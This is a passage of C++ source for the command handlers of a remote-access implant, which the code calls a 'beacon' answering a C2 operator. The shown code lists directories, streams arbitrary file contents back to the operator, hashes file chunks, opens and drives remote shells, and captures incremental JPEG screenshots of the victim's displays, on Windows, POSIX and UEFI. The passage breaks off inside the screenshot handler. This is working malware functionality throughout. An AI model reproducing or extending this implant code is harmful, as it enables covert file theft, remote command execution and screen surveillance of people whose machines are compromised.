#include "commands.h"
#include "memory.h"
#include "file.h"
#include "directory_iterator.h"
#include "wire_listing.h"
#include "path.h"
#include "string.h"
#include "math.h"
#include "logger.h"
#include "sha2.h"
#include "core/containers/vector.h"
#include "core/binary/binary_writer.h"
#include "system_info.h"
#include "shell.h"

// =============================================================================
// Wire helpers
// =============================================================================

/// Upper bound the beacon will read for one GetFileContent command — a
/// ceiling only (the beacon allocates exactly what is requested); it exists
/// so a hostile/malformed wire request cannot demand a huge single heap
/// allocation. A larger request is clamped, which the protocol
/// already permits (reads may return fewer bytes than asked — EOF does).
constexpr UINT64 MAX_FILE_CHUNK_SIZE = 16 * 1024 * 1024;

// Decodes a NUL-terminated CHAR16 path from the command buffer into the
// handler's wide path buffer, normalizing separators. Returns false when the
// path does not fit the buffer — truncating it would silently target the
// WRONG directory, so the caller must refuse the command instead.
static BOOL DecodeWirePath(PCHAR command, USIZE commandLength, WCHAR *widePath, USIZE widePathSize)
{
    if (commandLength < sizeof(CHAR16))
    {
        widePath[0] = L'\0';
        return false;
    }

    PCCHAR16 wirePath = (PCCHAR16)(command);
    USIZE maxChar16 = commandLength / sizeof(CHAR16);
    USIZE wireLen = 0;
    while (wireLen < maxChar16 && wirePath[wireLen] != 0)
        wireLen++;

    // Overflow check BEFORE converting: a wire path longer than the buffer
    // would be silently cut mid-component by Char16ToWide.
    if (wireLen >= widePathSize)
    {
        widePath[0] = L'\0';
        return false;
    }

    USIZE len = StringUtils::Char16ToWide(
        Span<const CHAR16>(wirePath, wireLen),
        Span<WCHAR>(widePath, widePathSize));

    for (USIZE i = 0; i < len; ++i)
    {
        if (widePath[i] == L'\\' || widePath[i] == L'/')
            widePath[i] = (WCHAR)PATH_SEPARATOR;
    }
    return true;
}

// Maps an Error to the platform-INDEPENDENT code carried on the wire. Runtime
// errors already are platform-independent — their ErrorCodes value passes
// through unchanged. OS errors (the chain's root) are classified HERE, the
// only layer that knows which OS produced them, into the Fs_* CAUSE codes:
// consumers branch on a stable enum and never mirror per-OS code tables.
// Unmapped OS errors degrade to the chain's outer failure-site code (e.g.
// Fs_OpenFailed) — still platform-independent, just less specific.
static UINT32 ClassifyError(const Error &error)
{
    switch (error.RootPlatform())
    {
    case Error::PlatformKind::Windows:
        switch (error.RootCode())
        {
        case 0xC0000022u: // STATUS_ACCESS_DENIED
            return Error::Fs_AccessDenied;
        case 0xC0000034u: // STATUS_OBJECT_NAME_NOT_FOUND
        case 0xC000003Au: // STATUS_OBJECT_PATH_NOT_FOUND
            return Error::Fs_PathNotFound;
        case 0xC00000E6u: // STATUS_NO_SUCH_DEVICE
        case 0xC00000C0u: // STATUS_DEVICE_DOES_NOT_EXIST
        case 0xC00002B6u: // STATUS_DEVICE_REMOVED
        case 0xC000026Eu: // STATUS_VOLUME_DISMOUNTED
            return Error::Fs_DeviceGone;
        // HRESULTs from the COM/WPD layer. NTSTATUS warnings share the
        // 0x80000000 severity bit with HRESULT failures, but every NTSTATUS
        // case above is 0xC000xxxx — the two sets cannot collide.
        case 0x80070005u: // E_ACCESSDENIED
            return Error::Fs_AccessDenied;
        case 0x80070002u: // HRESULT_FROM_WIN32(ERROR_FILE_NOT_FOUND)
        case 0x80070003u: // HRESULT_FROM_WIN32(ERROR_PATH_NOT_FOUND)
        case 0x80070490u: // HRESULT_FROM_WIN32(ERROR_NOT_FOUND)
            return Error::Fs_PathNotFound;
        case 0x80070037u: // HRESULT_FROM_WIN32(ERROR_DEV_NOT_EXIST 55)
        case 0x8007048Fu: // HRESULT_FROM_WIN32(ERROR_DEVICE_NOT_CONNECTED 1167)
        case 0x80070651u: // HRESULT_FROM_WIN32(ERROR_DEVICE_REMOVED 1617)
            return Error::Fs_DeviceGone;
        default:
            break;
        }
        break;
    case Error::PlatformKind::Posix:
        switch (error.RootCode())
        {
        case 1:  // EPERM
        case 13: // EACCES
            return Error::Fs_AccessDenied;
        case 2:  // ENOENT
        case 20: // ENOTDIR
            return Error::Fs_PathNotFound;
        case 6:  // ENXIO
        case 19: // ENODEV
            return Error::Fs_DeviceGone;
        default:
            break;
        }
        break;
    case Error::PlatformKind::Uefi:
        switch (error.RootCode() & 0xFFFFu) // Error::Uefi truncates to the low 32 bits; EFI codes are EFI_ERROR(n)
        {
        case 15: // EFI_ACCESS_DENIED
            return Error::Fs_AccessDenied;
        case 14: // EFI_NOT_FOUND
            return Error::Fs_PathNotFound;
        default:
            break;
        }
        break;
    default:
        break;
    }
    return error.Code; // runtime failure-site code (platform-independent)
}

// Writes an error response carrying the failure's classification:
// [status:u32 = StatusError][errorCode:u32] (8 bytes), where errorCode is a
// platform-INDEPENDENT ErrorCodes value — an Fs_* cause code when the OS
// error is recognized, otherwise the failure-site code. Success responses
// are unaffected; older C2 parsers read the status word first and stop, so
// the extra tail is ignored by them — new C2s use it to classify the failure
// (access denied vs device removed vs path too long) instead of guessing.
static VOID WriteErrorDetailResponse(PPCHAR response, PUSIZE responseLength, const Error &error)
{
    PCHAR buffer = new CHAR[8];
    if (buffer == nullptr)
    {
        *response = nullptr;
        *responseLength = 0;
        return;
    }
    *response = buffer;
    *responseLength = 8;
    BinaryWriter writer{Span<UINT8>((UINT8 *)buffer, 8)};
    writer.Write<UINT32>(StatusCode::StatusError);
    writer.Write<UINT32>(ClassifyError(error));
}

// Writes a simple error response with the given status code. Always leaves
// room for the status word; if even this allocation fails, *response stays
// null and the dispatch loop's null-response guard handles it.
static VOID WriteErrorResponse(PPCHAR response, PUSIZE responseLength, StatusCode code)
{
    USIZE length = *responseLength;
    if (length < sizeof(UINT32))
        length = sizeof(UINT32);
    PCHAR buffer = new CHAR[length];
    if (buffer == nullptr)
    {
        *response = nullptr;
        *responseLength = 0;
        return;
    }
    *response = buffer;
    *responseLength = length;
    BinaryWriter writer{Span<UINT8>((UINT8 *)buffer, length)};
    writer.Write<UINT32>((UINT32)code);
}


static BOOL IsDotEntry(const DirectoryEntry &entry)
{
    return StringUtils::Equals((PWCHAR)entry.Name, (const WCHAR *)L".") ||
           StringUtils::Equals((PWCHAR)entry.Name, (const WCHAR *)L"..");
}

// =============================================================================
// Command handlers
// =============================================================================

VOID Handle_GetDirectoryContentCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, [[maybe_unused]] Context *context)
{
    LOG_INFO("Handling GetDirectoryContentCommand.");
    WCHAR directoryPath[2048];
    // Decoding path from command — a path that does not fit is rejected, never truncated
    if (!DecodeWirePath(command, commandLength, directoryPath, 2048))
    {
        WriteErrorDetailResponse(response, responseLength, Error(Error::Fs_PathTooLong));
        return;
    }
    LOG_INFO("GetDirectoryContent: %ws", directoryPath);

    auto result = DirectoryIterator::Create(directoryPath);
    if (!result)
    {
        WriteErrorDetailResponse(response, responseLength, result.Error());
        return;
    }
    // Iterator successfully created, so we can now read entries
    DirectoryIterator &iter = result.Value();
    Vector<DirectoryEntry> entries;
    if (!entries.Init())
    {
        WriteErrorDetailResponse(response, responseLength, Error(Error::Fs_ReadFailed));
        return;
    }
    // Iterate through the directory entries, skipping "." and "..", and add
    // them to the vector. A REAL iteration failure (volume dismounted, access
    // revoked mid-scan, unreadable entry) must surface as an error response —
    // returning the entries gathered so far as a success would silently ship
    // a truncated listing that the operator cannot distinguish from complete.
    while (true)
    {
        auto next = iter.Next();
        if (next)
        {
            const DirectoryEntry &entry = iter.Get();
            if (IsDotEntry(entry))
                continue;
            if (!entries.Add(entry))
            {
                WriteErrorDetailResponse(response, responseLength, Error(Error::Fs_ReadFailed));
                return;
            }
            continue;
        }

        const Error &error = next.Error();
        if (error.Platform == Error::PlatformKind::Runtime && error.Code == Error::Fs_NoMoreEntries)
            break; 

        LOG_ERROR("Directory iteration failed after %d entries: %e", entries.Count, error);
        WriteErrorDetailResponse(response, responseLength, error);
        return;
    }

    // Encode the compact listing — one exact-size allocation, the
    // variable-length layout ~26 B/entry against the legacy fixed 553. The
    // time encoding is per platform: Windows/WPD fill FILETIMEs, POSIX already
    // carries unix seconds, UEFI sends zeros (unix kind, zero values).
#if defined(PLATFORM_WINDOWS)
    constexpr ListingTimeEncoding TimeKind = ListingTimeEncoding::ListingTime_FileTime;
#else
    constexpr ListingTimeEncoding TimeKind = ListingTimeEncoding::ListingTime_UnixSeconds;
#endif
    Buffer<CHAR> packet;
    Result<VOID, Error> encoded = WireListing::Encode(
        Span<const DirectoryEntry>(entries.Data, (USIZE)entries.Count), TimeKind, packet);
    if (!encoded)
    {
        // The iteration succeeded but the frame could not be built (exact-size
        // allocation failure, size overflow) — a graceful error beats the
        // null-response reconnect, which would tear down the whole session.
        LOG_ERROR("Failed to encode the directory content response for %d entries: %e",
                  entries.Count, encoded.Error());
        WriteErrorDetailResponse(response, responseLength, encoded.Error());
        return;
    }
    USIZE encodedSize = packet.Size; // Release() zeroes Size — capture before handoff
    *response = packet.Release();
    *responseLength = encodedSize;
    LOG_INFO("Directory content retrieved successfully with %d entries", entries.Count);
}

VOID Handle_GetFileContentCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, [[maybe_unused]] Context *context)
{
    LOG_INFO("Handling GetFileContentCommand.");
    // Validate the wire layout [readCount:u64][offset:u64][path:CHAR16..NUL]
    // before reading it — a truncated command must not be dereferenced.
    USIZE pathOffset = sizeof(UINT64) + sizeof(UINT64);
    if (commandLength < pathOffset + sizeof(CHAR16))
    {
        WriteErrorDetailResponse(response, responseLength, Error(Error::Command_Invalid));
        return;
    }
    // Getting parameters from command buffer: read count, offset and file path
    UINT64 readCount = *(PUINT64)(command);
    UINT64 offset = *(PUINT64)(command + sizeof(UINT64));
    if (readCount > MAX_FILE_CHUNK_SIZE)
        readCount = MAX_FILE_CHUNK_SIZE; // defend the beacon heap from a hostile/large request
    LOG_INFO("Reading file content with offset: %llu and count: %llu.", offset, readCount);

    WCHAR filePath[2048];
    if (!DecodeWirePath(command + pathOffset, commandLength - pathOffset, filePath, 2048))
    {
        WriteErrorDetailResponse(response, responseLength, Error(Error::Fs_PathTooLong));
        return;
    }
    LOG_INFO("GetFileContent: %ws offset=%llu count=%llu", filePath, offset, readCount);

    auto openResult = File::Open(filePath, File::ModeRead);
    if (!openResult)
    {
        WriteErrorDetailResponse(response, responseLength, openResult.Error());
        return;
    }
    LOG_INFO("File opened successfully: %ws", filePath);

    File &file = openResult.Value();
    auto setOffsetResult = file.SetOffset((USIZE)offset);
    if (!setOffsetResult)
    {
        LOG_ERROR("Failed to set file offset: %llu, error: %e", offset, setOffsetResult.Error());
        WriteErrorDetailResponse(response, responseLength, setOffsetResult.Error());
        return;
    }

    // Read into a scratch buffer sized for the request; the response carries
    // exactly the bytes actually read (header [status][bytesRead] + data), so
    // a short read at EOF never ships trailing uninitialized heap memory.
    PUINT8 scratch = new UINT8[(USIZE)readCount + 1];
    if (scratch == nullptr)
    {
        LOG_ERROR("Failed to allocate the file read buffer for %llu bytes", readCount);
        *response = nullptr;
        *responseLength = 0;
        return;
    }

    auto readResult = file.Read(Span<UINT8>(scratch, (USIZE)readCount));
    if (!readResult)
    {
        LOG_ERROR("Failed to read file content, error: %e", readResult.Error());
        delete[] scratch;
        WriteErrorDetailResponse(response, responseLength, readResult.Error());
        return;
    }
    UINT64 bytesRead = readResult.Value();

    *responseLength = sizeof(UINT32) + sizeof(UINT64) + (USIZE)bytesRead;
    *response = new CHAR[*responseLength];
    if (*response == nullptr)
    {
        LOG_ERROR("Failed to allocate the file content response for %llu bytes", bytesRead);
        *responseLength = 0;
        delete[] scratch;
        return;
    }

    BinaryWriter writer{Span<UINT8>((UINT8 *)*response, *responseLength)};
    writer.Write<UINT32>(StatusCode::StatusSuccess);
    writer.Write<UINT64>(bytesRead);
    Memory::Copy(*response + sizeof(UINT32) + sizeof(UINT64), scratch, (USIZE)bytesRead);
    delete[] scratch;

    LOG_INFO("File content read successfully for %llu bytes requested, %llu bytes read", readCount, bytesRead);
}

// Computes the SHA-256 hash of a file chunk
VOID Handle_GetFileChunkHashCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, [[maybe_unused]] Context *context)
{
    LOG_INFO("Handling GetFileChunkHashCommand.");
    // Validate the wire layout [chunkSize:u64][offset:u64][path:CHAR16..NUL]
    USIZE hashPathOffset = sizeof(UINT64) + sizeof(UINT64);
    if (commandLength < hashPathOffset + sizeof(CHAR16))
    {
        WriteErrorDetailResponse(response, responseLength, Error(Error::Command_Invalid));
        return;
    }
    // Getting parameters from command buffer: chunk size, offset and file path
    UINT64 chunkSize = *(PUINT64)(command);
    UINT64 offset = *(PUINT64)(command + sizeof(UINT64));

    LOG_INFO("Computing file chunk hash with offset: %llu and chunk size: %llu.", offset, chunkSize);

    // Decoding file path from command buffer — reject instead of truncate
    WCHAR filePath[2048];
    if (!DecodeWirePath(command + hashPathOffset, commandLength - hashPathOffset, filePath, 2048))
    {
        WriteErrorDetailResponse(response, responseLength, Error(Error::Fs_PathTooLong));
        return;
    }
    LOG_INFO("GetFileChunkHash: %ws chunkSize=%llu offset=%llu", filePath, chunkSize, offset);

    auto openResult = File::Open(filePath, File::ModeRead);
    if (!openResult)
    {
        WriteErrorDetailResponse(response, responseLength, openResult.Error());
        return;
    }
    LOG_INFO("File opened successfully: %ws", filePath);

    File &file = openResult.Value();

    UINT64 bufferSize = Math::Min((UINT64)chunkSize, (UINT64)0xffff);
    PUINT8 buffer = new UINT8[bufferSize];
    if (buffer == nullptr)
    {
        LOG_ERROR("Failed to allocate the chunk read buffer (%llu bytes)", bufferSize);
        WriteErrorDetailResponse(response, responseLength, Error(Error::Fs_ReadFailed));
        return;
    }

    SHA256 sha256;
    UINT64 totalRead = 0;
    // Read file in small chunks and update the hash until we read the
    // requested count or reach the end of file. A read FAILURE is an error —
    // hashing what happened to be read so far would return a digest of a
    // truncated chunk as if it were valid, corrupting download verification.
    while (totalRead < chunkSize)
    {
        UINT64 bytesToRead = Math::Min(bufferSize, chunkSize - totalRead);
        LOG_INFO("Reading file chunk with offset: %llu and count: %llu.", offset + totalRead, bytesToRead);
        auto setOffsetResult = file.SetOffset((USIZE)(offset + totalRead));

        if (!setOffsetResult)
        {
            LOG_ERROR("Failed to set file offset: %llu, error: %e", offset + totalRead, setOffsetResult.Error());
            WriteErrorDetailResponse(response, responseLength, setOffsetResult.Error());
            delete[] buffer;
            return;
        }

        auto readResult = file.Read(Span<UINT8>(buffer, (USIZE)bytesToRead));
        if (!readResult)
        {
            LOG_ERROR("Failed to read file chunk at offset %llu, error: %e", offset + totalRead, readResult.Error());
            WriteErrorDetailResponse(response, responseLength, readResult.Error());
            delete[] buffer;
            return;
        }
        UINT32 bytesRead = readResult.Value();
        if (bytesRead == 0)
            break;
        sha256.Update(Span<const UINT8>(buffer, bytesRead));
        totalRead += bytesRead;
    }
    delete[] buffer;
    // Prepare the response buffer - writing status code and SHA-256 digest of the file chunk
    *responseLength = sizeof(UINT32) + SHA256_DIGEST_SIZE;
    *response = new CHAR[*responseLength];
    if (*response == nullptr)
    {
        LOG_ERROR("Failed to allocate the chunk hash response");
        *responseLength = 0;
        return;
    }

    UINT8 digest[SHA256_DIGEST_SIZE];
    sha256.Final(Span<UINT8, SHA256_DIGEST_SIZE>(digest));

    BinaryWriter writer{Span<UINT8>((UINT8 *)*response, *responseLength)};
    writer.Write<UINT32>(StatusCode::StatusSuccess);
    writer.WriteBytes(Span<const UINT8>(digest, SHA256_DIGEST_SIZE));
    LOG_INFO("GetFileChunkHash: hashed %llu bytes", (UINT64)totalRead);
}

// Open (spawn) a shell. Request: (none). Response: [status:4][shellId:8].
// The beacon assigns the slot id (first free slot) and returns it; the C2 must
// reuse it for Read/Write/Close.
VOID Handle_OpenShellCommand([[maybe_unused]] PCHAR command, [[maybe_unused]] USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context)
{
    LOG_INFO("Handling OpenShellCommand.");

    auto openResult = context->shellManager.Open();
    if (!openResult)
    {
        LOG_ERROR("Failed to open shell (error: %e)", openResult.Error());
        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
        return;
    }

    ShellId shellId = openResult.Value();
    LOG_INFO("Shell opened, assigned id %llu", shellId);
    *responseLength = sizeof(UINT32) + sizeof(ShellId);
    *response = new CHAR[*responseLength];
    if (*response == nullptr)
    {
        LOG_ERROR("Failed to allocate the OpenShell response");
        *responseLength = 0;
        return;
    }
    BinaryWriter writer{Span<UINT8>((UINT8 *)*response, *responseLength)};
    writer.Write<UINT32>(StatusCode::StatusSuccess);
    writer.Write<ShellId>(shellId);
}

VOID Handle_WriteShellCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context)
{
    LOG_INFO("Handling WriteShellCommand.");

    if (commandLength < sizeof(ShellId))
    {
        LOG_ERROR("WriteShell: missing shell id");
        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
        return;
    }

    ShellId shellId = 0;
    Memory::Copy(&shellId, command, sizeof(shellId));
    PCHAR input = command + sizeof(ShellId);
    USIZE inputLength = commandLength - sizeof(ShellId);

    Shell *shell = context->shellManager.Get(shellId);
    if (shell == nullptr)
    {
        LOG_ERROR("WriteShell: no open shell for id %llu", shellId);
        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
        return;
    }

    // Trim for null terminator
    while (inputLength > 0 && input[inputLength - 1] == '\0')
        inputLength--;

    auto writeResult = shell->Write(input, inputLength);
    if (!writeResult)
    {
        LOG_ERROR("Failed to write command to shell (id %llu)", shellId);
        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
        return;
    }
    LOG_INFO("Command written to shell (id %llu), bytes written: %llu", shellId, writeResult.Value());

    // Prepare the response buffer - writing status code
    *response = new CHAR[*responseLength];
    if (*response == nullptr)
    {
        LOG_ERROR("Failed to allocate the WriteShell response");
        *responseLength = 0;
        return;
    }
    BinaryWriter writer{Span<UINT8>((UINT8 *)*response, *responseLength)};
    writer.Write<UINT32>(StatusCode::StatusSuccess);
}

VOID Handle_ReadShellCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context)
{
    LOG_INFO("Handling ReadShellCommand.");

    if (commandLength < sizeof(ShellId))
    {
        LOG_ERROR("ReadShell: missing shell id");
        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
        return;
    }

    ShellId shellId = 0;
    Memory::Copy(&shellId, command, sizeof(shellId));
    Shell *shell = context->shellManager.Get(shellId);
    if (shell == nullptr)
    {
        LOG_ERROR("ReadShell: no open shell for id %llu", shellId);
        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
        return;
    }

    CHAR buffer[4096];
    auto readResult = shell->Read(buffer, sizeof(buffer));
    if (!readResult)
    {
        LOG_ERROR("Failed to read from shell (id %llu)", shellId);
        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
        return;
    }

    // Construct the response with status code and the data read from the shell.
    // bytesRead includes the trailing NUL that StringUtils::Copy appends, so the
    // payload spans the shell output plus its terminator.
    USIZE bytesRead = readResult.Value() + 1;
    *responseLength += bytesRead;
    *response = new CHAR[*responseLength];
    if (*response == nullptr)
    {
        LOG_ERROR("Failed to allocate the ReadShell response (%llu bytes)", bytesRead);
        *responseLength = 0;
        return;
    }
    BinaryWriter writer{Span<UINT8>((UINT8 *)*response, *responseLength)};
    writer.Write<UINT32>(StatusCode::StatusSuccess);
    writer.WriteBytes(Span<const UINT8>((const UINT8 *)buffer, bytesRead - 1));
    writer.Write<UINT8>('\0');
}

VOID Handle_CloseShellCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context)
{
    LOG_INFO("Handling CloseShellCommand.");

    if (commandLength < sizeof(ShellId))
    {
        LOG_ERROR("CloseShell: missing shell id");
        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
        return;
    }

    ShellId shellId = 0;
    Memory::Copy(&shellId, command, sizeof(shellId));
    context->shellManager.Close(shellId);
    LOG_INFO("Shell instance closed for id %llu", shellId);

    *responseLength = sizeof(UINT32);
    *response = new CHAR[*responseLength];
    if (*response == nullptr)
    {
        LOG_ERROR("Failed to allocate the CloseShell response");
        *responseLength = 0;
        return;
    }
    BinaryWriter writer{Span<UINT8>((UINT8 *)*response, *responseLength)};
    writer.Write<UINT32>(StatusCode::StatusSuccess);
}

// Exit - gracefully terminate the agent.
//
// Acknowledges the operator, then signals the main loop to tear down. The main
// loop sends this ACK, exits both of its while (!context.shouldExit) loops, and
// returns from start(); WebSocketClient is released when it goes out of scope, and
// Context::~Context frees any shell/screen-capture state before entry_point() calls
// ExitProcess(). No platform-specific code lives here: termination flows through
// the existing ExitProcess() abstraction, so this command is uniform across all
// targets (on UEFI, ExitProcess() maps to EfiResetShutdown and powers off).
VOID Handle_ExitCommand([[maybe_unused]] PCHAR command, [[maybe_unused]] USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context)
{
    LOG_INFO("Handling ExitCommand: operator requested agent termination.");

    // Acknowledge so the operator knows the exit was received and will be honored.
    // The exit is honored even if the response allocation fails — the operator
    // just sees the null-response reconnect instead of an ACK.
    *responseLength = sizeof(UINT32);
    *response = new CHAR[*responseLength];
    if (*response == nullptr)
    {
        LOG_ERROR("Failed to allocate the Exit response");
        *responseLength = 0;
        context->shouldExit = true;
        return;
    }
    BinaryWriter writer{Span<UINT8>((UINT8 *)*response, *responseLength)};
    writer.Write<UINT32>(StatusCode::StatusSuccess);

    // Signal the main loop to stop after sending this response.
    context->shouldExit = true;
}

VOID Handle_GetDisplaysCommand([[maybe_unused]] PCHAR command, [[maybe_unused]] USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context)
{
    LOG_INFO("Handling GetDisplaysCommand.");

    if (context->screenCaptureContext == nullptr)
        context->screenCaptureContext = new ScreenCaptureContext();

    // Getting the list of display devices and validating the result
    auto displays = Screen::GetDevices();
    if (!displays)
    {
        LOG_ERROR("Failed to enumerate display devices");
        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
        return;
    }
    LOG_INFO("Display devices enumerated successfully with %u display(s)", displays.Value().Count);

    ScreenDeviceList &deviceList = displays.Value();
    context->screenCaptureContext->DeviceList = deviceList;

    // Prepare the response buffer - writing status code, device count and array of ScreenDevice structures
    *responseLength += sizeof(deviceList.Count) + (USIZE)(deviceList.Count * sizeof(ScreenDevice));
    *response = new CHAR[*responseLength];
    if (*response == nullptr)
    {
        LOG_ERROR("Failed to allocate the GetDisplays response for %u display(s)", deviceList.Count);
        *responseLength = 0;
        return;
    }
    BinaryWriter writer{Span<UINT8>((UINT8 *)*response, *responseLength)};
    writer.Write<UINT32>(StatusCode::StatusSuccess);
    writer.Write<UINT32>(deviceList.Count);
    writer.WriteBytes(Span<const UINT8>((const UINT8 *)deviceList.Devices, (USIZE)(deviceList.Count * sizeof(ScreenDevice))));

    LOG_INFO("GetDisplays: %u display(s)", deviceList.Count);
}

VOID JpegCallback(PVOID context, PVOID data, INT32 size)
{
    JpegBuffer *jpegBuffer = (JpegBuffer *)context;

    if (jpegBuffer->allocationFailed)
        return;

    if (data == nullptr)
        jpegBuffer->Initialize(size);

    if (jpegBuffer->allocationFailed)
        return;

    // Grow the reusable JPEG buffer when this chunk no longer fits.
    if ((USIZE)jpegBuffer->offset + (USIZE)size > jpegBuffer->size)
    {
        USIZE newSize = Math::Max((USIZE)jpegBuffer->size * 2, (USIZE)jpegBuffer->offset + (USIZE)size);
        if (newSize > 0xFFFFFFFF)
            newSize = 0xFFFFFFFF;
        jpegBuffer->EnsureCapacity((UINT32)newSize);
        if (jpegBuffer->allocationFailed)
            return;
    }

    Memory::Copy(jpegBuffer->outputBuffer + jpegBuffer->offset, data, (USIZE)size);
    jpegBuffer->offset += (UINT32)size;
}

// Builds the zero-section idle reply [status:u32][count:u32 = 0]; shared by
// the gate-proven and the diff-detected unchanged-frame paths
static BOOL WriteIdleScreenshotResponse(PPCHAR response, PUSIZE responseLength)
{
    *responseLength = sizeof(UINT32) + sizeof(UINT32);
    *response = new CHAR[*responseLength];
    if (*response == nullptr)
    {
        *responseLength = 0;
        return false;
    }
    BinaryWriter writer{Span<UINT8>((UINT8 *)*response, *responseLength)};
    writer.Write<UINT32>(StatusCode::StatusSuccess);
    writer.Write<UINT32>(0);
    return true;
}

/// @brief Append target for encoding a dirty rect straight into the reply packet
struct PacketJpegContext
{
    Buffer<CHAR> *packet;
    BOOL failed;
};

// JPEG write sink for the incremental reply: compressed bytes are appended
// directly into the persistent packet. JpegEncoder::Encode takes a void
// callback, so the flag carries any allocation failure to the caller — the
// same pattern as JpegBuffer::allocationFailed
VOID PacketJpegCallback(PVOID context, PVOID data, INT32 size)
{
    PacketJpegContext *encodeContext = (PacketJpegContext *)context;

    if (encodeContext->failed)
        return;

    if (!encodeContext->packet->Append(Span<const CHAR>((const CHAR *)data, (USIZE)size)))
        encodeContext->failed = true;
}

VOID Handle_GetScreenshotCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context)
{
    if (commandLength < 3 * sizeof(UINT32))
    {
        WriteErrorDetailResponse(response, responseLength, Error(Error::Command_Invalid));
        return;
    }
    // Retrieve parameters from command buffer
    auto displayIndex = *(PUINT32)(command);
    auto quality = *(PUINT32)(command + sizeof(UINT32));
    auto isFullScreen = *(PUINT32)(command + sizeof(UINT32) + sizeof(UINT32));
    LOG_INFO("Handling GetScreenshotCommand for display index: %u, quality: %u, isFullScreen: %u", displayIndex, quality, isFullScreen);

    // Ensure the screen capture context exists - create it if it doesn't, and validate the result
    if (context->screenCaptureContext == nullptr)
        context->screenCaptureContext = new ScreenCaptureContext();

    if (context->screenCaptureContext == nullptr)
    {
        LOG_ERROR("Failed to allocate the screen capture context");
        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
        return;
    }

    if (context->screenCaptureContext->DeviceList.Count == 0)
    {
        auto displays = Screen::GetDevices();
        if (!displays)
        {
            LOG_ERROR("Failed to enumerate display devices");
            WriteErrorResponse(response, responseLength, StatusCode::StatusError);
            return;
        }
        context->screenCaptureContext->DeviceList = displays.Value();
        LOG_INFO("Display devices enumerated successfully with %u display(s)", context->screenCaptureContext->DeviceList.Count);
    }

    if (displayIndex >= context->screenCaptureContext->DeviceList.Count)
    {
        LOG_ERROR("Display index %u out of range (%u displays)", displayIndex, context->screenCaptureContext->DeviceList.Count);
        WriteErrorDetailResponse(response, responseLength, Error(Error::Command_Invalid));
        return;
    }

    const ScreenDevice &device = context->screenCaptureContext->DeviceList.Devices[displayIndex];

    if (context->screenCaptureContext->GraphicsList.count == 0)
        context->screenCaptureContext->GraphicsList.Init(context->screenCaptureContext->DeviceList.Count);

    // The alloc may have failed (count stays 0 and is retried) — never index
    // the array before it is known to exist
    if (context->screenCaptureContext->GraphicsList.graphicsArray == nullptr)
    {
        LOG_ERROR("Failed to allocate the per-display graphics list");
        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
        return;
    }

    Graphics &graphics = context->screenCaptureContext->GraphicsList.graphicsArray[displayIndex];

    // Unconditional: Init is a no-op unless the buffers are missing or the
    // display dimensions changed (a mode change after a display-list refresh
    // must reallocate, not reuse the old-mode buffers)
    graphics.Init(device);

    if (!graphics.IsInitialized())
    {
        LOG_ERROR("Failed to allocate screenshot buffers for display index: %u", displayIndex);
        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
        return;
    }

    // Persistent capture resources (Windows GDI reuse): created on first use;
    // the platform layer rebuilds them in place on mode changes and failures.
    // A display swap at the same list index retires the old monitor's state —
    // its cached DC and diff base describe a different screen
    if (graphics.captureState == nullptr || !graphics.deviceKnown ||
        graphics.deviceLeft != device.Left || graphics.deviceTop != device.Top)
    {
        graphics.ReleaseCaptureState();
        auto state = Screen::CreateCaptureState(device);
        if (state)
            graphics.captureState = state.Value();
        graphics.deviceLeft = device.Left;
        graphics.deviceTop = device.Top;
        graphics.deviceKnown = true;
    }

    // Capture policy: low-quality streams may use 16bpp capture (the platform
    // layer decides per machine via its one-time probe); after a clean frame
    // the change gate may prove the screen unchanged and skip the readback
    CaptureOptions captureOptions;
    captureOptions.BitsPerPixel = (quality < CaptureDepthQualityThreshold) ? 16 : 32;
    captureOptions.AllowSkip = !isFullScreen && graphics.lastFrameClean;
    CaptureStatus captureStatus;
    Memory::Zero(&captureStatus, sizeof(captureStatus));

    if (!Screen::Capture(device, Span<RGB>(graphics.currentScreenshot, device.Width * device.Height),
                         graphics.captureState, &captureOptions, &captureStatus))
    {
        LOG_ERROR("Failed to capture the screen for display index: %u", displayIndex);
        // The capture may have failed after the change gate advanced its
        // baseline; force a re-baseline before the gate may skip again
        graphics.lastFrameClean = false;
        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
        return;
    }

    // Gate-proven unchanged frame: the frame buffer was not written, so the
    // diff base still matches the receiver — reply the empty section list
    // without diffing or encoding anything
    if (captureStatus.FrameUnchanged)
    {
        if (!WriteIdleScreenshotResponse(response, responseLength))
        {
            LOG_ERROR("Failed to allocate the empty screenshot response for display index: %u", displayIndex);
            return;
        }
        graphics.lastFrameClean = true;
        return;
    }

    // In case of full screen request, encode the whole screenshot as JPEG and send it back.
    // A depth switch (16<->32bpp capture) invalidates the diff base, so it
    // takes the same full-frame path to rebuild the receiver canvas
    if (isFullScreen || captureStatus.DepthChanged)
    {
        graphics.jpegBuffer.Reset();
        graphics.jpegBuffer.ReserveForImage(device.Width, device.Height);
        auto encodeResult = JpegEncoder::Encode(JpegCallback, &graphics.jpegBuffer, (INT32)quality, (INT32)device.Width, (INT32)device.Height, 3, Span<const UINT8>((UINT8 *)graphics.currentScreenshot, device.Width * device.Height * sizeof(RGB)));
        if (encodeResult.IsErr() || graphics.jpegBuffer.allocationFailed)
        {
            LOG_ERROR("Failed to encode the screenshot for display index: %u", displayIndex);
            WriteErrorResponse(response, responseLength, StatusCode::StatusError);
            return;
        }
